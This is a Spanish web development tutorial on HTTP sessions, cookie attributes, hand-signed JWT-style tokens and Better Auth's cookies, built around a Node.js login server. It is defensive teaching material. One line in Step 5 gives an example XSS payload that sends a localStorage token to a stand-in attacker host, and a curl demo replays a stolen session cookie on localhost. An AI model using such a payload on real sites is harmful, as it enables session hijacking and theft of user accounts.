HTTP **no tiene memoria**: cada petición llega como si fuera la primera. Aun así, esta plataforma sabe quién eres en cada página. Aquí construyes un login con sesiones y cookies, comparas con un token firmado y descifras las cookies de Better Auth.

**Requisitos:** el proyecto `web-lab` de las secciones anteriores.

## Paso 1: por qué hace falta "recordar"

**Qué es:** sin nada que te identifique en la petición, el servidor **no puede** saber que eres quien inició sesión hace un minuto. La solución tiene dos piezas:

1. Al iniciar sesión, el servidor responde con **`Set-Cookie`**: "guarda este dato".
2. Después, el navegador lo **adjunta solo** en la cabecera **`Cookie`** de cada petición al mismo sitio.

Lo que distingue las dos estrategias de esta sección es **qué lleva la cookie**: un identificador (Paso 2) o los datos firmados (Paso 6).

## Paso 2: el login con sesiones en servidor

**Qué es:** en las **sesiones en servidor**, la cookie lleva solo un **identificador aleatorio**. Quién eres y cuándo caduca se queda en el servidor.

**Cómo se usa:** crea `sesiones.js` en `web-lab`.

```js
// Archivo: sesiones.js
// Login con sesiones en servidor y cookies, en http://localhost:3002
import { createServer } from "node:http";
import { randomBytes, scryptSync, timingSafeEqual } from "node:crypto";

const PUERTO = 3002;
const DURACION_SESION_S = 60 * 60; // 1 hora
const EN_PRODUCCION = process.env.NODE_ENV === "production";

// ─── "Base de datos" de usuarios: la contraseña se guarda como hash, nunca en claro ───
function hashear(contrasena, sal = randomBytes(16).toString("hex")) {
  return `${sal}:${scryptSync(contrasena, sal, 64).toString("hex")}`;
}

function contrasenaCorrecta(contrasena, guardado) {
  const [sal, hash] = guardado.split(":");
  const calculado = scryptSync(contrasena, sal, 64);
  return timingSafeEqual(calculado, Buffer.from(hash, "hex"));
}

const usuarios = new Map([
  ["dani@example.com", { id: "u_1", nombre: "Dani", hash: hashear("contrasena-segura-123") }],
]);

// ─── Sesiones en servidor: id aleatorio → datos de la sesión ───
const sesiones = new Map();

function crearSesion(usuarioId) {
  const id = randomBytes(32).toString("base64url");
  sesiones.set(id, { usuarioId, caduca: Date.now() + DURACION_SESION_S * 1000 });
  return id;
}

function leerCookies(peticion) {
  const cookies = {};
  for (const par of (peticion.headers.cookie ?? "").split(";")) {
    const [nombre, ...resto] = par.trim().split("=");
    if (nombre) cookies[nombre] = decodeURIComponent(resto.join("="));
  }
  return cookies;
}

function usuarioDeLaPeticion(peticion) {
  const id = leerCookies(peticion).sid;
  const sesion = id && sesiones.get(id);
  if (!sesion) return null;
  if (sesion.caduca < Date.now()) {
    sesiones.delete(id);
    return null;
  }
  return [...usuarios.values()].find((u) => u.id === sesion.usuarioId) ?? null;
}

function cookieDeSesion(valor, maxAge) {
  const atributos = [`sid=${valor}`, "Path=/", "HttpOnly", "SameSite=Lax", `Max-Age=${maxAge}`];
  if (EN_PRODUCCION) atributos.push("Secure");
  return atributos.join("; ");
}

// ─── Utilidades ───
async function leerFormulario(peticion) {
  let texto = "";
  for await (const trozo of peticion) texto += trozo;
  return new URLSearchParams(texto);
}

function html(respuesta, cuerpo, estado = 200, cabeceras = {}) {
  respuesta.writeHead(estado, { "Content-Type": "text/html; charset=utf-8", ...cabeceras });
  respuesta.end(`<!doctype html><html lang="es"><head><meta charset="utf-8"><title>Sesiones</title></head><body>${cuerpo}</body></html>`);
}

const escapar = (texto) =>
  texto.replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]);

// ─── Rutas ───
const servidor = createServer(async (peticion, respuesta) => {
  const url = new URL(peticion.url ?? "/", `http://${peticion.headers.host}`);
  const usuario = usuarioDeLaPeticion(peticion);
  console.log(`${peticion.method} ${url.pathname} · ${usuario ? usuario.nombre : "sin sesión"}`);

  if (url.pathname === "/" && peticion.method === "GET") {
    if (!usuario) {
      return html(
        respuesta,
        `<h1>Hola, invitado</h1>
<form method="post" action="/login">
  <input name="email" type="email" placeholder="Correo" required>
  <input name="contrasena" type="password" placeholder="Contraseña" required>
  <button>Entrar</button>
</form>`,
      );
    }
    return html(
      respuesta,
      `<h1>Hola, ${escapar(usuario.nombre)}</h1>
<p>Tu servidor sabe quién eres por la cookie <code>sid</code>.</p>
<form method="post" action="/logout"><button>Salir</button></form>`,
    );
  }

  if (url.pathname === "/login" && peticion.method === "POST") {
    const datos = await leerFormulario(peticion);
    const email = (datos.get("email") ?? "").trim().toLowerCase();
    const candidato = usuarios.get(email);
    // Mismo mensaje si el correo no existe o la contraseña falla: no revela qué cuentas existen
    if (!candidato || !contrasenaCorrecta(datos.get("contrasena") ?? "", candidato.hash)) {
      return html(respuesta, `<p>Correo o contraseña incorrectos. <a href="/">Volver</a></p>`, 401);
    }
    const id = crearSesion(candidato.id);
    respuesta.writeHead(302, { Location: "/", "Set-Cookie": cookieDeSesion(id, DURACION_SESION_S) });
    return respuesta.end();
  }

  if (url.pathname === "/logout" && peticion.method === "POST") {
    const id = leerCookies(peticion).sid;
    if (id) sesiones.delete(id); // la sesión deja de existir en el servidor
    respuesta.writeHead(302, { Location: "/", "Set-Cookie": cookieDeSesion("", 0) });
    return respuesta.end();
  }

  if (url.pathname === "/api/yo" && peticion.method === "GET") {
    respuesta.writeHead(usuario ? 200 : 401, { "Content-Type": "application/json; charset=utf-8" });
    return respuesta.end(JSON.stringify(usuario ? { id: usuario.id, nombre: usuario.nombre } : { error: "No has iniciado sesión" }));
  }

  html(respuesta, "<h1>404</h1>", 404);
});

servidor.listen(PUERTO, "127.0.0.1", () => {
  console.log(`Servidor de sesiones en http://localhost:${PUERTO}`);
});
```

- **`hashear` nunca guarda la contraseña:** guarda el resultado de `scrypt`, lento a propósito para que probar millones cueste años. La **sal**, 16 bytes aleatorios por usuario, da _hashes_ distintos para la misma contraseña.
- **`timingSafeEqual`** compara en tiempo constante: `===` se detiene en el primer carácter distinto, y midiendo el tiempo se podría adivinar el _hash_.
- **`crearSesion`** usa 32 bytes de `randomBytes`, imposibles de adivinar. **El mismo mensaje** para un correo que no existe y una contraseña mala impide averiguar qué correos tienen cuenta, y **`escapar`** evita el XSS de B3.1.

Arráncalo en su propia terminal:

```bash
node sesiones.js
```

```text
Servidor de sesiones en http://localhost:3002
```

<Callout type="risk">

- **Nunca contraseñas en claro ni con un _hash_ rápido** (MD5, SHA-256 a secas): tras una filtración, se descifran en minutos. Usa `scrypt`, `bcrypt` o `argon2`; Better Auth usa `scrypt`.
- **Las sesiones en un `Map`** se pierden al reiniciar y no se comparten entre instancias (en Vercel, cada función puede ser otra). En producción van a una base de datos (Paso 7).
- **`scryptSync` bloquea el proceso** decenas de milisegundos. En un servidor real, la versión asíncrona.

</Callout>

## Paso 3: seguir la sesión con `curl`

**Qué es:** quien presenta la cookie **es tú** para el servidor. Con sesiones en servidor, el _logout_ la borra allí, y una copia robada deja de valer.

**Cómo se usa:** `curl -c archivo` guarda las cookies y `-b archivo` las envía. Sin sesión:

```bash
curl -i http://localhost:3002/api/yo
```

```text
HTTP/1.1 401 Unauthorized
Content-Type: application/json; charset=utf-8

{"error":"No has iniciado sesión"}
```

Con una contraseña mala y con un correo que no existe, las dos respuestas son **idénticas**: `401` y `Correo o contraseña incorrectos`.

```bash
curl -i -X POST http://localhost:3002/login -d "email=dani@example.com&contrasena=mala"
curl -i -X POST http://localhost:3002/login -d "email=nadie@example.com&contrasena=mala"
```

El login correcto, guardando las cookies (las mayúsculas del correo dan igual):

```bash
curl -i -c tarro.txt -X POST http://localhost:3002/login -d "email=Dani@Example.com&contrasena=contrasena-segura-123"
```

```text
HTTP/1.1 302 Found
Location: /
Set-Cookie: sid=paONAdtNlp9NmgUjsNaDoiMVhuqqvmj1xyRSqLBGhsk; Path=/; HttpOnly; SameSite=Lax; Max-Age=3600
```

- **Un `302`** (redirección temporal) a `/`, con la cookie. Así la guardó `curl` (el valor cambia en cada login):

```bash
cat tarro.txt
```

```text
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

#HttpOnly_localhost	FALSE	/	FALSE	1791542094	sid	yHDI5X6AmobGm7foFfMOeeKJjChv3mi1rjoS8ftjYBk
```

Con la cookie, el servidor sabe quién eres:

```bash
curl -i -b tarro.txt http://localhost:3002/api/yo
```

```text
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"id":"u_1","nombre":"Dani"}
```

Y en la terminal del servidor:

```text
GET /api/yo · sin sesión
POST /login · sin sesión
POST /login · sin sesión
POST /login · sin sesión
GET /api/yo · Dani
```

Ahora, una cookie robada: copia el valor de `sid` de `tarro.txt` y úsalo a mano.

```bash
curl http://localhost:3002/api/yo -H "Cookie: sid=PEGA_AQUI_EL_VALOR"
```

```text
{"id":"u_1","nombre":"Dani"}
```

Cierra sesión y repite con la cookie robada:

```bash
curl -b tarro.txt -c tarro.txt -X POST http://localhost:3002/logout
curl http://localhost:3002/api/yo -H "Cookie: sid=PEGA_AQUI_EL_VALOR"
```

```text
{"error":"No has iniciado sesión"}
```

- **La cookie robada ya no sirve:** el _logout_ hizo `sesiones.delete(id)` en el servidor. Es la gran ventaja de este modelo.

<Callout type="risk">

- **El _logout_ debe borrar la sesión en el servidor,** no solo la cookie. Con solo `Max-Age=0`, una copia robada seguiría valiendo hasta caducar.
- **`tarro.txt` contiene una sesión válida:** ni a Git ni a nadie. Bórralo al terminar (`rm tarro.txt`).
- **Sin límite de intentos, el login admite fuerza bruta.** Las apps reales limitan los intentos por IP y por cuenta, y responden `429 Too Many Requests`.

</Callout>

## Paso 4: los atributos de una cookie

**Qué es:** tras el valor, los **atributos** deciden cuándo se envía una cookie y quién puede leerla.

| Atributo       | Qué hace                                                                                                                     | Por qué en una cookie de sesión                                            |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------- |
| `HttpOnly`     | JavaScript **no** puede leerla (`document.cookie` no la ve)                                                                  | Un script inyectado (XSS) no puede robar la sesión                         |
| `Secure`       | Solo se envía por HTTPS                                                                                                      | Nadie la lee en una red wifi pública sin cifrar                            |
| `SameSite=Lax` | No se envía en peticiones que otras webs lanzan "por detrás" (formularios `POST`, `fetch`, imágenes); sí al seguir un enlace | Protege contra CSRF: otra web no puede hacer peticiones en tu nombre       |
| `Max-Age=3600` | Caduca en 3600 segundos (`0` la borra)                                                                                       | Sin él, es una cookie "de sesión del navegador" que desaparece al cerrarlo |
| `Path=/`       | Se envía en todas las rutas del sitio                                                                                        | La sesión vale para toda la app                                            |
| `Domain`       | Si se indica, se envía también a los subdominios                                                                             | Sin él (lo recomendable), solo al dominio exacto que la creó               |

**Cómo se usa:** el servidor añade `Secure` solo con `NODE_ENV=production`.

```bash
NODE_ENV=production node sesiones.js
```

- **En el `Set-Cookie` del login aparece `Secure`.** Los navegadores lo aceptan en `localhost` sin HTTPS, pero `curl` no siempre: por eso solo se activa en producción.

<Callout type="risk">

- **`SameSite=None` exige `Secure`** y vuelve a permitir el envío desde otras webs. Solo para casos como un _widget_ incrustado; para una app normal, `Lax`.
- **`Domain=tudominio.com` comparte la cookie con todos los subdominios:** un blog antiguo e inseguro en un subdominio podría leer o pisar la sesión. No lo pongas sin necesidad.
- **Cada cookie viaja en cada petición,** incluidas imágenes y CSS, con un límite de unos 4 KB. Nada de datos grandes.

</Callout>

## Paso 5: qué ve JavaScript en el navegador

**Qué es:** una cookie `HttpOnly` viaja con cada petición, pero **JavaScript no la ve**. `localStorage`, en cambio, lo lee cualquier script de la página.

**Cómo se usa:** con `sesiones.js` en marcha, abre `http://localhost:3002/`, entra con `dani@example.com` y `contrasena-segura-123`, y en la consola de DevTools (`Cmd` + `Option` + `I`) ejecuta, línea a línea:

```js
document.cookie = "tema=dark; Path=/; Max-Age=31536000";
localStorage.setItem("token", "eyJ-token-de-ejemplo");
document.cookie;
localStorage.getItem("token");
const respuesta = await fetch("/api/yo");
respuesta.status;
```

```text
'tema=dark'
'eyJ-token-de-ejemplo'
200
```

En _Application_ → _Cookies_ verás `tema`, sin _HttpOnly_, y `sid`, con _HttpOnly_ y _SameSite_ `Lax`.

- **`document.cookie` solo muestra `tema=dark`:** `sid` existe y se envía (el `fetch` da `200`), pero JavaScript no la lee.
- **Un token en `localStorage` lo roba cualquier script inyectado** con una línea: `fetch("https://atacante.com?t=" + localStorage.getItem("token"))`.

| Aspecto                   | Cookie `HttpOnly`                                                                                       | `localStorage`                                  |
| ------------------------- | ------------------------------------------------------------------------------------------------------- | ----------------------------------------------- |
| La lee JavaScript         | No                                                                                                      | Sí                                              |
| Se envía sola al servidor | Sí, en cada petición                                                                                    | No, hay que añadirla a mano                     |
| Ante un XSS               | No se puede robar (aunque el script sí puede hacer peticiones en tu nombre mientras estás en la página) | Se puede robar y usar desde cualquier sitio     |
| Sirve para                | Sesiones                                                                                                | Preferencias que no son secretas (tema, idioma) |

<Callout type="risk">

- **`HttpOnly` reduce el daño de un XSS, no lo evita:** el script no se lleva la cookie, pero puede hacer `fetch` a tu API mientras la página está abierta. La defensa principal es escapar todo (Astro lo hace con `{}`).
- **La división correcta es la de esta plataforma:** el tema, que no es secreto, en `localStorage`; la sesión, en una cookie `HttpOnly`.

</Callout>

## Paso 6: la alternativa, un token firmado (JWT)

**Qué es:** el token lleva **los datos del usuario dentro**, firmados con un secreto que solo conoce el servidor. Es la idea de los **JWT** (_JSON Web Tokens_): el servidor no guarda nada y solo comprueba la firma.

**Cómo se usa:** crea `token.js`.

```js
// Archivo: token.js
// Un token firmado "a mano" (la idea de un JWT): los datos viajan en el token, firmados con un secreto
import { createHmac, timingSafeEqual } from "node:crypto";

const SECRETO = "un-secreto-largo-que-solo-conoce-el-servidor-1234567890";

const base64url = (texto) => Buffer.from(texto).toString("base64url");

function firmar(datos) {
  const carga = base64url(JSON.stringify(datos));
  const firma = createHmac("sha256", SECRETO).update(carga).digest("base64url");
  return `${carga}.${firma}`;
}

function verificar(token) {
  const [carga, firma] = token.split(".");
  if (!carga || !firma) return { valido: false, motivo: "formato incorrecto" };
  const esperada = createHmac("sha256", SECRETO).update(carga).digest("base64url");
  const a = Buffer.from(firma);
  const b = Buffer.from(esperada);
  if (a.length !== b.length || !timingSafeEqual(a, b)) return { valido: false, motivo: "firma no válida" };
  const datos = JSON.parse(Buffer.from(carga, "base64url").toString());
  if (datos.exp < Date.now() / 1000) return { valido: false, motivo: "caducado" };
  return { valido: true, datos };
}

const ahora = Math.floor(Date.now() / 1000);
const token = firmar({ sub: "u_1", nombre: "Dani", rol: "alumno", exp: ahora + 3600 });
console.log("Token:", token);
console.log("Verificación:", verificar(token));

// 1. Los datos NO están cifrados: cualquiera puede leerlos
const [carga] = token.split(".");
console.log("Lo que lee cualquiera:", Buffer.from(carga, "base64url").toString());

// 2. Pero no se pueden cambiar sin el secreto: la firma deja de coincidir
const cargaFalsa = base64url(JSON.stringify({ sub: "u_1", nombre: "Dani", rol: "admin", exp: ahora + 3600 }));
const tokenFalso = `${cargaFalsa}.${token.split(".")[1]}`;
console.log("Token manipulado:", verificar(tokenFalso));

// 3. Caduca solo: el servidor no guarda nada, así que no puede "cerrar" un token antes de tiempo
const caducado = firmar({ sub: "u_1", nombre: "Dani", rol: "alumno", exp: ahora - 1 });
console.log("Token caducado:", verificar(caducado));
```

```bash
node token.js
```

```text
Token: eyJzdWIiOiJ1XzEiLCJub21icmUiOiJEYW5pIiwicm9sIjoiYWx1bW5vIiwiZXhwIjoxNzkxNTQyMTA5fQ.3YzyFe-l1zTescgcgD62HVOxU6pZrNuj27xIq74e1tI
Verificación: {
  valido: true,
  datos: { sub: 'u_1', nombre: 'Dani', rol: 'alumno', exp: 1791542109 }
}
Lo que lee cualquiera: {"sub":"u_1","nombre":"Dani","rol":"alumno","exp":1791542109}
Token manipulado: { valido: false, motivo: 'firma no válida' }
Token caducado: { valido: false, motivo: 'caducado' }
```

- **Los datos no están cifrados,** solo codificados en _base64url_: cualquiera los lee. Nada que el usuario no deba ver.
- **No se pueden cambiar sin el secreto:** el token con `rol: "admin"` se rechaza, porque la firma (un HMAC) ya no coincide.
- **No se puede revocar antes de caducar:** el servidor no guarda nada que borrar. Un token robado vale hasta que caduque.

| Aspecto                            | Sesión en servidor                           | Token firmado (JWT)                                                 |
| ---------------------------------- | -------------------------------------------- | ------------------------------------------------------------------- |
| Qué lleva la cookie                | Un identificador aleatorio                   | Los datos del usuario, firmados                                     |
| Qué guarda el servidor             | La sesión (en memoria o en la base de datos) | Nada (solo el secreto)                                              |
| Coste por petición                 | Una consulta para buscar la sesión           | Calcular una firma                                                  |
| _Logout_ real o expulsar a alguien | Inmediato (borrar la sesión)                 | Difícil: hay que esperar a que caduque o mantener una "lista negra" |
| Si cambia el rol del usuario       | Se nota en la siguiente petición             | El token viejo sigue diciendo el rol antiguo hasta que caduca       |

Para una app con su propio servidor, como las tuyas en Astro, **las sesiones son la opción más segura y sencilla**. Los tokens sirven cuando varios servicios verifican al usuario sin compartir base de datos.

<Callout type="risk">

- **Con el secreto, cualquiera fabrica tokens válidos** con el rol que quiera. Va en una variable de entorno, como `BETTER_AUTH_SECRET`; aquí está en el código solo como ejemplo.
- **No escribas tu propia librería de JWT:** las reales (como `jose`) cubren casos que han causado vulnerabilidades famosas, como aceptar el algoritmo `none`.
- **Un token largo en `localStorage`** suma los dos peores riesgos: legible por cualquier script y válido durante días. Si usas tokens, cortos y en una cookie `HttpOnly`.

</Callout>

## Paso 7: qué hace Better Auth con tus cookies

**Qué es:** esta plataforma usa Better Auth, que combina las dos estrategias.

**Cómo se usa:** así responde el servidor al crear una cuenta, con los valores sustituidos por marcadores:

```text
HTTP/1.1 200 OK
set-cookie: better-auth.session_token=<token>.<firma>; Max-Age=2592000; Path=/; HttpOnly; SameSite=Lax
set-cookie: better-auth.session_data=<datos-de-sesión>; Max-Age=300; Path=/; HttpOnly; SameSite=Lax
```

- **`better-auth.session_token`** es una **sesión en servidor**, como tu `sid`: identifica un documento de la colección `session` de MongoDB (`token`, `userId`, `expiresAt`…). Lleva **`.<firma>`** con `BETTER_AUTH_SECRET`, así que una cookie inventada se rechaza sin consultar la base de datos. Dura 30 días (`Max-Age=2592000`) y se renueva si entras al menos una vez al día.
- **`better-auth.session_data`** es una **caché firmada** de 5 minutos (`Max-Age=300`): el servidor sabe quién eres sin consultar MongoDB en cada petición. Combina la rapidez del token con la revocación de la sesión, con un retraso máximo de 5 minutos.
- **Falta `Secure`** porque es `http://localhost`. En HTTPS, Better Auth lo añade y renombra la cookie a **`__Secure-better-auth.session_token`**, un prefijo que obliga a recibirla por HTTPS.

En cada petición, `src/middleware.ts` lee esa cookie y deja el usuario en `Astro.locals.user`. Sin sesión, las páginas redirigen a `/login` y las APIs responden `401`, como tu `usuarioDeLaPeticion`.

<Callout type="risk">

- **En producción, la cookie se llama `__Secure-better-auth.session_token`:** con el nombre de `localhost` no la encontrarás. Es un error habitual en pruebas.
- **Cambiar `BETTER_AUTH_SECRET` cierra todas las sesiones,** porque las firmas dejan de valer. Es lo que quieres si el secreto se filtró, no por accidente.

</Callout>

```js
      timeZone: "America/Mexico_City",
      hourCycle: "h23",
    });
    return html(respuesta, `<h1>Perfil de ${escapar(usuario.nombre)}</h1><p>Tu sesión caduca a las ${caduca} (hora de México).</p>`);
  }
```

La hora será la de tu login más una hora. En esta plataforma, los puntos 1 y 2 dan `better-auth.session_token` y `better-auth.session_data`, las dos con _HttpOnly_ y _SameSite_ `Lax` (en producción, también _Secure_ y `__Secure-`). `document.cookie` devuelve una cadena vacía: el tema va en `localStorage`.

<Callout type="risk">

- **`302` para páginas, `401` para APIs:** un `fetch` que recibe un `302` lo sigue y obtiene el HTML del login en lugar de un error claro. Esta plataforma hace esa distinción en su _middleware_.
- **`sesiones.get(...)` es seguro aquí** porque `usuarioDeLaPeticion` ya comprobó la sesión. Si lo separas en otras funciones, vuelve a comprobarla.

</Callout>

<Callout type="mastery">

Entiendes cómo tu servidor sabe quién eres en cada petición: el login crea una sesión y responde con `Set-Cookie`, el navegador devuelve la cookie en cada petición, `HttpOnly` impide que JavaScript la lea, `SameSite` la protege de otras webs, y el _logout_ borra la sesión en el servidor. Sabes por qué una sesión se puede revocar y un JWT no.

</Callout>

## Resumen

- HTTP no tiene estado: el navegador envía una cookie en cada petición.
- Sesión en servidor: un identificador aleatorio; se revoca borrándola en el servidor.
- `HttpOnly`, `Secure`, `SameSite=Lax` y `Max-Age`: los atributos clave.
- Un JWT lleva los datos firmados: legibles, no modificables y no revocables antes de caducar.
- Better Auth: sesión en MongoDB más una caché firmada de 5 minutos.
